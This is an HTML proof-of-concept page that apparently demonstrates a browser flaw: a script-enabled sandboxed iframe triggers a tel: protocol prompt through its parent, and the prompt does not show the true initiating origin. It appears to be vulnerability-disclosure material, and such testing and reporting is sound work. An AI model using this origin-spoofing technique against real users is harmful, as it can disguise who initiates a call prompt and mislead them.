<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC - Tel Protocol Spoofing</title>
    <style>
        body { font-family: Arial, sans-serif; }
        h1 { color: #2c3e50; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>

<h1>Test for Tel Protocol Spoofing in Sandboxed Iframe</h1>

<!-- Button to trigger 'tel:' protocol -->
<button onclick="window.open('tel:1234567890')">ClickMe to trigger tel: protocol</button>

<!-- Sandboxed iframe -->
<iframe src="about:blank" sandbox="allow-scripts" id="sandboxedIframe" style="width: 100%; height: 200px; border: 1px solid #ccc;"></iframe>

<script>
    // This script will dynamically load iframe content and simulate tel: protocol
    const iframe = document.getElementById('sandboxedIframe');
    
    // Injecting HTML content into the iframe to simulate a different origin (for PoC purpose)
    iframe.contentWindow.document.open();
    iframe.contentWindow.document.write(`
        <html>
            <body>
                <h2>Inside Sandbox</h2>
                <p>This iframe is sandboxed with allow-scripts but is unable to display the correct initiating origin.</p>
                <button onclick="parent.open('tel:9876543210')">ClickMe (Inside iframe) - Initiate tel: Protocol</button>
            </body>
        </html>
    `);
    iframe.contentWindow.document.close();
</script>

</body>
</html>
